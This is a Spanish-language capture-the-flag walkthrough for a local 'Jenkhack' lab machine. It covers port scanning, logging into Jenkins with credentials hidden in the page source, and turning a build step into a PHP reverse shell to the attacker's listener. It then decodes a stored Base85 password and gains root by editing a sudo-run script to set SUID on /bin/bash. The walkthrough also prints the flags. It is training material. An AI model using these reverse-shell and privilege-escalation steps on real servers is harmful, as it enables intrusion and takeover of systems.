---
icon: flag
---

# CTF Jenkhack Easy

URL Download CTF = [https://drive.google.com/file/d/1I6YvDFbUpDM4llw\_FHSMQCw3zlmHW7Xe/view?usp=sharing](https://drive.google.com/file/d/1I6YvDFbUpDM4llw_FHSMQCw3zlmHW7Xe/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip jenkhack.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh jenkhack.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.19.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 10:47 EDT
Nmap scan report for 172.19.0.2
Host is up (0.000023s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Hacker Nexus - jenkhack.hl
|_http-server-header: Apache/2.4.58 (Ubuntu)
443/tcp  open  ssl/http Jetty 10.0.13
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| tls-alpn: 
|_  http/1.1
|_http-server-header: Jetty(10.0.13)
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2024-09-01T12:00:45
|_Not valid after:  2025-09-01T12:00:45
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/
8080/tcp open  http     Jetty 10.0.13
|_http-server-header: Jetty(10.0.13)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:42:AC:13:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.62 seconds
```

Vemos que hay una pagina web en el puerto `80` y en el puerto `8080` mediante `HTTPS` hay un jenkins.

Si nos metemos en la siguiente `URL`.

```
URL = http://<IP>:8080/
```

Nos redirijira a un jenkins, pero no tendremos las credenciales para pasar, a parte de que tambien se puede acceder mediante un dominio, si nos vamos al puerto `80`, veremos el siguiente dominio.

```
jenkhack.hl
```

Por lo que lo apuntaremos en el archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>         jenkhack.hl
```

Lo guardamos y si nos metemos mediante el dominio, veremos que es con un certificado `SSL` o `HTTPS`, pero estaremos en las mismas en un panel de login, pero si buscamos en el puerto `80` en el codigo fuente de la pagina web.

## Login jenkins

```html
<section class="services" id="services">
            <h2>Our Services</h2>
            <div class="service-grid">
                <div class="service-item">
                    <img src="https://miro.medium.com/v2/resize:fit:1400/0*_n2AQxhJSwAlIMke" alt="jenkins-admin">
                    <h3>Advanced <span class="highlight">Admin Tools</span></h3>
                    <p>Manage your systems efficiently with our comprehensive tools.</p>
                    <p><em>Explore how <span class="hidden">jenkins-admin</span> can optimize your workflows.</em></p>
                </div>
                <div class="service-item">
                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9QsnEbRf5NU51IyoPD3LSok3q4d_25auKA&s" alt="cassandra">
                    <h3>Database Management</h3>
                    <p>Secure and manage your databases with cutting-edge solutions.</p>
                    <p><em>Learn more about <span class="hidden">cassandra</span> for advanced data management.</em></p>
                </div>
                <div class="service-item">
                    <img src="https://pbs.twimg.com/profile_images/1707408286981472256/ATqgURB5_400x400.jpg" alt="Hacking Tools">
                    <h3>Exclusive <span class="highlight">Hacking Tools</span></h3>
                    <p>Access a suite of tools designed for professionals and enthusiasts alike.</p>
                    <p><em>Visit <span class="hidden">jenkhack.hl</span> for unique insights and tools.</em></p>
                </div>
            </div>
        </section>
```

Veremos esa seccion de ahi que es donde se alojan las imagenes, en el codigo hay nombres alternativos por si no cargara la imagen.

```html
<img src="https://miro.medium.com/v2/resize:fit:1400/0*_n2AQxhJSwAlIMke" alt="jenkins-admin">

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm9QsnEbRf5NU51IyoPD3LSok3q4d_25auKA&s" alt="cassandra">
```

Hay 2 nombres sospechosos `jenkins-admin` y `cassandra`, por lo que podremos probar las dos combinaciones en el panel de login del jenkins, metiendonos mediante `HTTPS`.

```
URL = https://jenkhack.hl/
```

Si probamos como usuario `jenkins-admin` y como contraseña `cassandra` veremos que son las credenciales correctas y estaremos dentro como administradores.

## Panel admin jenkins

### Reverse Shell

Si nos vamos a la siguiente ubicacion `My-views`, dentro de aqui pinchamos en `admin`, le damos a la opcion `configure`, podremos bajar un poco donde pone `Build Steps` y hay un fragmento de codigo en bash como `whoami`, pues esto lo cambiaremos por una `reverse shell` de la siguiente forma.

```
URL = https://jenkhack.hl/me/my-views/view/all/job/admin/configure
```

```php
php -r '$sock=fsockopen("<IP>",<PORT>);shell_exec("sh <&3 >&3 2>&3");'
```

Y le damos a `Apply`, seguidamente `Save`, una vez hecho eso, antes de ejecutarlo, estaremos a la escucha.

```shell
nc -lvnp <PORT>
```

Y en la pagina del jenkins, le damos a la opcion llamada `Build Now`, esto lo que hara sera ejecutar el fragmento de codigo, si nos vamos a donde teniamos la escucha veremos que tendremos una shell con el usuario `jenkins`.

Info:

```
connect to [192.168.5.145] from (UNKNOWN) [172.19.0.2] 34364
whoami
jenkins
```

Sanitizamos la shell (TTY).

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user jenkhack

Si nos vamos al siguiente directorio.

```shell
cd /var/www/
```

Veremos una carpeta llamada `jenkhack/` y si nos metemos dentro veremos un archivo llamado `note.txt` que dice lo siguiente.

```
jenkhack:C1V9uBl8!'Ci*`uDfP
```

Por lo que vemos son las credenciales del usuario `jenkhack` pero la contraseña esta encriptada en `Base85` y si la desencriptamos, dice lo siguiente.

```
jenkinselmejor
```

Por lo que vemos esa es la contraseña del usuario, asi que nos cambiaremos a el.

```shell
su jenkhack
```

Metemos la contraseña obtenida anteriormente y ya seremos dicho usuario, por lo que leeremos la flag.

> user.txt

```
3635ccd7044e99813883c8a1b95ced04
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for jenkhack on 0c02f2cd043e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jenkhack may run the following commands on 0c02f2cd043e:
    (ALL : ALL) NOPASSWD: /usr/local/bin/bash
```

Vemos que podemos ejecutar como `root` el binario `bash` pero en una ruta poco comun, si inspeccionamos dicho binario, estara codificado su interior, por lo que probaremos a ejecutarlo.

```shell
sudo /usr/local/bin/bash
```

Info:

```
Welcome to the bash application!
Running command...
This is the bash script running.
```

No nos da mucha informacion, pero si observamos en el directorio raiz, vemos que los permisos del `opt/` su grupo es nuestro usuario, y en su interior esta el archivo `bash.sh` que su interior es el siguiente.

```
drwxrwxr-x 1 root jenkhack 4096 Sep  1 14:57 .
```

```shell
#!/bin/bash

# This script in bash
echo "This is the bash script running."
```

Por lo que vemos efectivamente esta ejecutando este script el cual podemos modificar pero antes haciendo unas cosas, por lo que podremos escalar a `root` haciendo lo siguiente.

```shell
mv bash.sh bash.bak
cp bash.bak bash.sh
```

Y ahora si podremos editarlo.

```shell
nano bash.sh

#Dentro del nano
<RESTO_DEL_CODIGO>

chmod u+s /bin/bash
echo 'Permisos de bash cambiados correctamente.'

```

Guardamos el codigo y ahora probaremos a ejecutar de nuevo el binario.

```shell
sudo /usr/local/bin/bash
```

Info:

```
Welcome to the bash application!
Running command...
This is the bash script running.
Permisos de bash cambiados correctamente.
```

Y si ahora comprobamos la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Vemos que funciono, por lo que haremos lo siguiente.

```shell
/usr/bin/bash -p
```

Y con esto ya seremos `root`, asi que leeremos la flag.

> root.txt

```
c43cb8e62105280785c7500ba705a9fc
```
